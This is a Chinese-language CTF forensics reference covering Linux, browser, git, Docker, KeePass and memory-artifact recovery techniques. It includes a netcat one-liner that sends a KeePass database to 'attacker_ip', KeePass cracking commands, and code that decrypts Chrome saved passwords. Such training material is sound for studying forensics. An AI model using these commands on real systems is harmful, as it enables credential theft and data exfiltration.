# CTF Forensics - Linux 和应用取证

## 目录
- [日志分析](#log-analysis)
- [Linux 攻击链取证](#linux-attack-chain-forensics)
- [Docker 镜像取证（Pragyan 2026）](#docker-image-forensics-pragyan-2026)
- [浏览器凭证解密](#browser-credential-decryption)
- [Firefox 浏览器历史（places.sqlite）](#firefox-browser-history-placessqlite)
- [从 PCAP 中提取 USB 音频](#usb-audio-extraction-from-pcap)
- [TFTP Netascii 解码](#tftp-netascii-decoding)
- [通过弱 RSA 解密 TLS 流量](#tls-traffic-decryption-via-weak-rsa)
- [ROT18 解码](#rot18-decoding)
- [常见编码](#common-encodings)
- [Git 目录恢复（UTCTF 2024）](#git-directory-recovery-utctf-2024)
- [KeePass 数据库提取与破解（H7CTF 2025）](#keepass-database-extraction-and-cracking-h7ctf-2025)
- [Git Reflog 和 fsck 恢复压缩提交（BearCatCTF 2026）](#git-reflog-and-fsck-for-squashed-commit-recovery-bearcatctf-2026)
- [浏览器痕迹分析](#browser-artifact-analysis)
  - [Chrome/Chromium](#chromechromium)
  - [Firefox](#firefox)
- [通过字节暴力破解修复损坏的 Git Blob（CSAW CTF 2015）](#corrupted-git-blob-repair-via-byte-brute-force-csaw-ctf-2015)
- [VBA 宏取证 - Excel 单元格数据转 ELF 二进制（Sharif CTF 2016）](#vba-macro-forensics---excel-cell-data-to-elf-binary-sharif-ctf-2016)
- [以太坊/区块链交易追踪（Defenit CTF 2020）](#ethereum--blockchain-transaction-tracing-defenit-ctf-2020)
- [通过 pyrasite 恢复 Python 内存源码（Insomni'hack 2017）](#python-in-memory-source-recovery-via-pyrasite-insomnihack-2017)

---

## 日志分析

```bash
# 搜索 flag 片段
grep -iE "(flag|part|piece|fragment)" server.log

# 重组分片 flag
grep "FLAGPART" server.log | sed 's/.*FLAGPART: //' | uniq | tr -d '\n'

# 查找异常
sort logfile.log | uniq -c | sort -rn | head
```

---

## Linux 攻击链取证

**模式（制作黑名单）：** 从日志 + PCAP + 恶意软件中完整还原攻击时间线。

**证据来源：**
```bash
# SSH 会话命令
grep -A2 "session opened" /var/log/auth.log

# 用户命令历史
cat /home/*/.bash_history

# 下载的恶意软件
find /usr/bin -newer /var/log/auth.log -name "ms*"

# 网络外泄
tshark -r capture.pcap -Y "tftp" -T fields -e tftp.source_file
```

**常见恶意软件模式：** AES-ECB 加密 + 同密钥 XOR，保存为 .enc 文件

---

## Docker 镜像取证（Pragyan 2026）

**模式（管道）：** Docker 构建过程中敏感数据泄露，但后续层被清理。

**关键洞察：** Docker 镜像配置 JSON（`blobs/sha256/<config_hash>`）永久保留所有 `RUN` 命令在 `history` 数组中，无论后续是否清理。

```bash
tar xf app.tar
# 查找配置 blob（非层 blob）
python3 -m json.tool blobs/sha256/<config_hash> | grep -A2 "created_by"
# 查找包含 flag 数据、密码、秘密的 RUN 命令
```

**分析步骤：**
1. 解压 Docker 镜像 tar 包：`tar xf app.tar`
2. 读取 `manifest.json` 找到配置 blob 哈希
3. 解析配置 blob JSON 中的 `history[].created_by` 条目
4. 每条记录显示执行的 Dockerfile 命令
5. 任何 `RUN` 命令中回显、写入或处理的秘密都会保存在历史中
6. 即使后续层执行了 `rm -f secret.txt`，之前的 `RUN echo "flag{...}" > secret.txt` 仍可见

---

## 浏览器凭证解密

**Chrome/Edge 登录数据解密（需要 master_key.txt）：**
```python
from Crypto.Cipher import AES
import sqlite3, json, base64

# 加载主密钥（来自 Local State 文件，DPAPI 保护）
with open('master_key.txt', 'rb') as f:
    master_key = f.read()

conn = sqlite3.connect('Login Data')
cursor = conn.cursor()
cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
for url, user, encrypted_pw in cursor.fetchall():
    # v10/v11 前缀 = AES-GCM 加密
    nonce = encrypted_pw[3:15]
    ciphertext = encrypted_pw[15:-16]
    tag = encrypted_pw[-16:]
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
    password = cipher.decrypt_and_verify(ciphertext, tag)
    print(f"{url}: {user}:{password.decode()}")
```

**从 Local State 提取主密钥：**
```python
import json, base64
with open('Local State', 'r') as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
# 去除 DPAPI 前缀（5 字节 "DPAPI"）
encrypted_key = encrypted_key[5:]
# Windows 上使用 CryptUnprotectData 获取主密钥
# CTF 中主密钥可能单独提供
```

---

## Firefox 浏览器历史（places.sqlite）

**模式（浏览器探秘）：** flag 隐藏在浏览器历史 URL 中。

```bash
# 快速方法
strings places.sqlite | grep -i "flag\|MetaCTF"

# 正规取证方法
sqlite3 places.sqlite "SELECT url FROM moz_places WHERE url LIKE '%flag%'"
```

**关键表：** `moz_places`（URL）、`moz_bookmarks`、`moz_cookies`

---

## 从 PCAP 中提取 USB 音频

**模式（跟我说话）：** USB 同步传输包含音频数据。

**提取流程：**
```bash
# 使用 tshark 导出 ISO 数据
tshark -r capture.pcap -T fields -e usb.iso.data > audio_data.txt

# 转换为原始音频并导入 Audacity
# 设置：有符号 16 位 PCM，单声道，适当采样率
# 听取口述的 flag 字符
```

**识别：** USB 传输类型 URB_ISOCHRONOUS = 实时音视频

---

## TFTP Netascii 解码

**问题：** TFTP netascii 模式破坏二进制传输；Wireshark 不自动解码。

**修复导出文件：**
```python
# 替换 netascii 序列：
# 0d 0a → 0a（CRLF → LF）
# 0d 00 → 0d（转义 CR）
with open('file_raw', 'rb') as f:
    data = f.read()
data = data.replace(b'\r\n', b'\n').replace(b'\r\x00', b'\r')
with open('file_fixed', 'wb') as f:
    f.write(data)
```

---

## 通过弱 RSA 解密 TLS 流量

**模式（篡改印章）：** TLS 1.2 使用 `TLS_RSA_WITH_AES_256_CBC_SHA`（无 PFS）。

**攻击流程：**
1. 从 Server Hello 包提取服务器证书（导出包字节 -> `public.der`）
2. 获取模数：`openssl x509 -in public.der -inform DER -noout -modulus`
3. 因式分解弱模数（dCode、factordb.com、yafu）
4. 生成私钥：`rsatool -p P -q Q -o private.pem`
5. 添加到 Wireshark：编辑 -> 首选项 -> TLS -> RSA 密钥列表

**解密后：**
- 跟踪 TLS 流查看 HTTP 流量
- 导出对象（文件 -> 导出对象 -> HTTP）
- 查找下载的可执行文件、API 调用

---
## ROT18 解码

ROT13 用于字母 + ROT5 用于数字。多阶段取证中常见的最终解码层：
```python
def rot18(text):
    result = []
    for c in text:
        if c.isalpha():
            base = ord('a') if c.islower() else ord('A')
            result.append(chr((ord(c) - base + 13) % 26 + base))
        elif c.isdigit():
            result.append(str((int(c) + 5) % 10))
        else:
            result.append(c)
    return ''.join(result)
```

---

## 常见编码

```bash
echo "base64string" | base64 -d
echo "hexstring" | xxd -r -p
# ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

## Git 目录恢复（UTCTF 2024）

```bash
# Web 服务器上暴露的 .git 目录
gitdumper.sh https://target/.git/ /tmp/repo

# 检查 reflog 以查找带有秘密的旧提交
cat .git/logs/HEAD
# 从 .git/objects/XX/YYYY 下载对象，使用 zlib 解压
```

**工具：** 来自 internetwache/GitTools 的 `gitdumper.sh` 最可靠。

---

## KeePass 数据库提取与破解（H7CTF 2025）

**模式（Moby Dock）：** 在被攻破的系统上发现的 KeePass 数据库（`.kdbx`）包含用于横向移动的 SSH 密钥或凭据。

**从远程系统传输：**
```bash
# 目标端：base64 编码并通过 netcat 发送
base64 .system.kdbx | nc attacker_ip 4444

# 攻击端：接收并解码
nc -lvnp 4444 > kdbx.b64 && base64 -d kdbx.b64 > system.kdbx
```

**破解 KeePass v4 数据库：**
```bash
# 标准 keepass2john（仅支持 KeePass v3）
keepass2john system.kdbx > hash.txt

# 针对 KeePass v4（KDBX 4.x 使用 Argon2）：使用自定义分支
git clone https://github.com/ivanmrsulja/keepass2john.git
cd keepass2john && make
./keepass2john system.kdbx > hash.txt

# 备选方案：keepass4brute（直接暴力破解）
python3 keepass4brute.py -d wordlist.txt system.kdbx
```

**从挑战上下文生成字典：**
```bash
# 从相关网站内容生成字典
cewl http://target:8080 -d 2 -m 5 -w cewl_words.txt

# 手动添加主题相关关键词
echo -e "expectopatronum\nharrypotter\nalohomora" >> cewl_words.txt

# 使用 hashcat 破解（Argon2 模式 13400）
hashcat -m 13400 hash.txt cewl_words.txt
```

**破解后提取凭据：**
1. 使用恢复的密码在 KeePassXC 中打开 `.kdbx`
2. 检查所有条目中的 SSH 私钥、密码、API 令牌
3. SSH 密钥通常存储在“Notes”或“Advanced”附件字段中

**关键点：** 标准的 `keepass2john` 不支持使用 Argon2 密钥派生的 KeePass v4（KDBX 4.x）数据库。请使用 `ivanmrsulja/keepass2john` 分支或 `keepass4brute` 来支持 v4。使用 `cewl` 针对相关 Web 服务生成上下文相关的字典。

---

## Git Reflog 和 fsck 用于合并提交恢复（BearCatCTF 2026）

**模式（关于海盗的诗）：** Git 仓库历史干净，数据被覆盖且历史通过 `git rebase --squash` 重写。原始提交作为孤立对象存在。

**恢复步骤：**
```bash
# 检查 reflog 以查找 rebase/squash 操作
git reflog --all

# 查找孤立（不可达）提交
git fsck --unreachable --no-reflogs

# 检查每个不可达提交
git show <commit-hash>
git diff <commit-hash>^ <commit-hash>

# 从孤立提交中提取特定文件版本
git show <commit-hash>:path/to/file
```

**关键点：** `git rebase --squash` 会从分支历史中移除提交，但不会删除底层对象。它们作为不可达对象存在，直到垃圾回收（`git gc`）运行。即使运行了 `git gc`，年轻于过期时间（默认 2 周）的对象仍然存在。调查 git 仓库隐藏数据时，务必检查 `git reflog` 和 `git fsck --unreachable`。

**检测：** Git 仓库历史异常干净（单个提交或 squash 合并提交）。挑战中提及“rewrite”、“rebase”、“squash”或“clean history”。

---

## 浏览器痕迹分析

### Chrome/Chromium

```bash
# 默认配置文件位置
# Linux: ~/.config/google-chrome/Default/
# macOS: ~/Library/Application Support/Google/Chrome/Default/
# Windows: %LOCALAPPDATA%\Google\Chrome\User Data\Default\

# 历史记录（SQLite）
sqlite3 "History" "SELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 50;"

# 下载记录
sqlite3 "History" "SELECT target_path, tab_url, datetime(start_time/1000000-11644473600,'unixepoch') FROM downloads;"

# Cookies（现代 Chrome 加密 — 需要 DPAPI/keychain 密钥）
sqlite3 "Cookies" "SELECT host_key, name, datetime(expires_utc/1000000-11644473600,'unixepoch') FROM cookies;"

# 登录数据（密码 — 加密）
sqlite3 "Login Data" "SELECT origin_url, username_value FROM logins;"

# 书签（JSON）
cat Bookmarks | python3 -m json.tool | grep -A2 '"url"'

# 本地存储 / IndexedDB — LevelDB 格式
# 使用 leveldb-dump 或 strings 查看 LevelDB 文件
strings "Local Storage/leveldb/"*.ldb | grep -i flag
```

### Firefox

```bash
# 配置文件位置：~/.mozilla/firefox/*.default-release/
# 查找配置文件
ls ~/.mozilla/firefox/ | grep default

# 历史记录 + 书签（places.sqlite）
sqlite3 places.sqlite "SELECT url, title, datetime(last_visit_date/1000000,'unixepoch') FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 50;"

# 表单历史
sqlite3 formhistory.sqlite "SELECT fieldname, value FROM moz_formhistory;"

# 保存的密码（需要 key4.db + logins.json）
# 使用 firefox_decrypt：python3 firefox_decrypt.py ~/.mozilla/firefox/PROFILE/

# 会话恢复（之前的标签页）
python3 -c "
import json, lz4.block
with open('sessionstore-backups/recovery.jsonlz4','rb') as f:
    f.read(8)  # 跳过魔数
    data = json.loads(lz4.block.decompress(f.read()))
    for w in data['windows']:
        for t in w['tabs']:
            print(t['entries'][-1]['url'])
"
```

**关键点：** 浏览器痕迹是带有非标准时间戳格式的 SQLite 数据库。Chrome 使用 WebKit 纪元（自 1601-01-01 起的微秒），Firefox 使用 Unix 纪元的微秒。务必检查历史记录、Cookies、登录数据、本地存储和会话恢复文件。加密密码需要主密钥（Windows 上的 DPAPI，macOS 上的 keychain，Firefox 上的 key4.db）。

---
## 通过字节暴力破解修复损坏的 Git Blob（CSAW CTF 2015）

**模式（sharpturn）：** Git 仓库中存在损坏的 blob 对象。由于 git 通过 SHA-1 哈希识别对象，单字节损坏会改变哈希值，使对象无法读取。通过对每个字节位置进行暴力破解，直到 `git hash-object` 产生预期的哈希值来修复。

```python
import subprocess, shutil

def repair_blob(filepath, target_hash):
    """暴力破解 git blob 中的单字节损坏。"""
    with open(filepath, 'rb') as f:
        data = bytearray(f.read())

    for pos in range(len(data)):
        original = data[pos]
        for val in range(256):
            if val == original:
                continue
            data[pos] = val
            with open(filepath, 'wb') as f:
                f.write(data)
            result = subprocess.run(
                ['git', 'hash-object', filepath],
                capture_output=True, text=True
            )
            if result.stdout.strip() == target_hash:
                print(f"修复字节 {pos}: 0x{original:02x} -> 0x{val:02x}")
                return True
            data[pos] = original

    with open(filepath, 'wb') as f:
        f.write(data)
    return False
```

**工作流程：**
1. 使用 `git fsck` 识别损坏的对象及其预期哈希
2. 定位 `.git/objects/` 中的损坏 blob 文件
3. 使用 `python3 -c "import zlib; print(zlib.decompress(open('blob','rb').read()))"` 解压
4. 对每个字节位置进行暴力破解（256 值 * 文件大小次尝试）
5. 使用 `git hash-object` 验证是否匹配预期哈希

**关键洞察：** Git 的内容寻址存储意味着即使 blob 损坏，提交树中也能知道预期的 SHA-1 哈希。单字节损坏可在几秒内暴力破解。对于多字节损坏，可结合上下文知识（例如源码必须能编译，数值常量必须有效）进行修复。

---

## VBA 宏取证 - Excel 单元格数据转 ELF 二进制（Sharif CTF 2016）

Excel 表格中隐藏了一个完整的可执行文件，存储为数值单元格。VBA（Visual Basic for Applications）宏通过 `CByte((cell_value - 78) / 3)` 转换每个单元格，并写入字节生成 ELF（可执行与链接格式）二进制。安全分析方法：导出为 CSV，使用 Python 重新实现转换。

```python
import csv
with open('data.csv') as f, open('binary', 'wb') as out:
    for row in csv.reader(f):
        for cell in row:
            if cell.strip():
                out.write(bytes([int((int(cell) - 78) / 3)]))
```

**关键洞察：** 通过电子表格单元格数值及算术转换传递恶意软件。应始终用 Python 重新实现 VBA 宏逻辑，而非直接执行宏。可用 `olevba` 工具提取转换公式。

**检测方法：** Excel 文件中单元格含大量数字，VBA 宏包含 `CByte`/`Chr`/`Write` 操作。

---

## 以太坊 / 区块链交易追踪（Defenit CTF 2020）

通过分析链上交易模式，追踪加密货币通过混币器（tumbler/mixer）服务的流向。

```python
import requests
from collections import defaultdict

def trace_ethereum_transactions(address, api_key, depth=3):
    """追踪 ETH 交易经过的混币跳转"""
    url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&apikey={api_key}"
    r = requests.get(url)
    txs = r.json()["result"]

    graph = defaultdict(list)
    for tx in txs:
        graph[tx["from"]].append({
            "to": tx["to"],
            "value": int(tx["value"]) / 1e18,  # Wei 转 ETH
            "timestamp": int(tx["timeStamp"])
        })

    # 混币检测启发式规则：
    # 1. 金额相关性：输入 ≈ 输出（扣除手续费）
    # 2. 时间：输出在几分钟/几小时内跟随输入
    # 3. 扇出模式：一个输入分裂为多个输出
    # 4. 整数金额：混币器常用整 ETH 数值

    # 按交易数量过滤（跳过高频水龙头/交易所）
    suspicious = {addr: txs for addr, txs in graph.items()
                  if 5 < len(txs) < 100}  # 非水龙头，非终端用户

    return suspicious

# 区块链取证工具：
# - Etherscan API：交易历史，内部交易
# - Blockchair：多链浏览器（BTC、ETH 等）
# - Chainalysis Reactor：商业工具，CTF 中常被引用
# - breadcrumbs.app：免费交易可视化
```

**关键洞察：** 区块链混币器掩盖交易轨迹，但留下统计模式。通过关联输入/输出金额（扣手续费）、时间窗口和中间钱包交易数量进行追踪。交易次数在 10-50 次的钱包可能是中介；1000 次以上为交易所/水龙头，应忽略。

---

## 通过 pyrasite 恢复 Python 内存中的源代码（Insomni'hack 2017）

当 Python 进程的源文件被删除但进程仍在运行时，可用 `pyrasite-shell` 附加进程，从内存中反编译代码对象。

```bash
# 1. 查找正在运行的 Python 进程
pgrep -f "python"

# 2. 使用 pyrasite 附加（需 ptrace 权限）
pyrasite-shell <PID>

# 3. 在 pyrasite shell 中枚举并反编译函数：
import sys, uncompyle6
# 列出所有全局变量和函数
for name, obj in globals().items():
    if hasattr(obj, 'func_code'):
        print(f"\n=== {name} ===")
        uncompyle6.main.uncompyle(sys.version_info[0] + sys.version_info[1]/10.0,
                                   obj.func_code, sys.stdout)

# 4. 还可检查包含秘密的变量
print(globals())  # 可能包含 flag、密钥等
```

**关键洞察：** `pyrasite` 通过 `ptrace` 向运行中的进程注入 Python shell。即使源文件被删除，所有代码对象和全局变量仍保留在内存中。`uncompyle6` 可将 `func_code` 对象反编译回可读的 Python 源码。对于 Python 3.9+ 进程，建议使用 [`pycdc`](https://github.com/zrax/pycdc)（`pycdc` 作用于 `.pyc` 文件——先用 `marshal.dump` 将代码对象写入磁盘）。

**检测方法：** 题目提供访问正在运行的系统，Python 进程活跃但 `.py` 源文件已删除。`ls -l /proc/<PID>/exe` 显示 Python 解释器；`/proc/<PID>/fd/` 可能仍引用已删除文件。检查 `ptrace` 权限（`/proc/sys/kernel/yama/ptrace_scope`）。
